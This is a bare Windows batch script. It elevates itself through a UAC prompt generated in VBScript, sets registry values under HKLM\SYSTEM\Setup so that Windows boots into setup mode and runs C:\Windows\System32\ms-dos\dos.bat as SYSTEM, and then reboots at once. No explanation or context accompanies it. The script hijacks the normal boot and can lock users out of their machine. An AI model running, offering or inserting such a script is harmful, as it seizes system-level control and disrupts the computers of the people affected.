@ECHO OFF
net session > nul 2>&1
if %errorLevel% == 0 (
  goto :main
) else (
  set _batchFile=%~f0
  set _Args=%*
  
  set _batchFile=""%_batchFile:"=%""
  set _Args=%_Args:"=""%

  echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\~ElevateMe.vbs"
  echo UAC.ShellExecute "cmd", "/c ""%_batchFile% %_Args%""", "", "runas", 1 >> "%temp%\~ElevateMe.vbs"
  
  wscript "%temp%\~ElevateMe.vbs" > nul 2>&1
)

:main
reg add HKLM\SYSTEM\Setup /v CmdLine /t REG_SZ /f /d C:\Windows\System32\ms-dos\dos.bat
reg add HKLM\SYSTEM\Setup /v SetupPhase /t REG_DWORD /f /d 4
reg add HKLM\SYSTEM\Setup /v SetupType /t REG_DWORD /f /d 2
shutdown -r -t 0
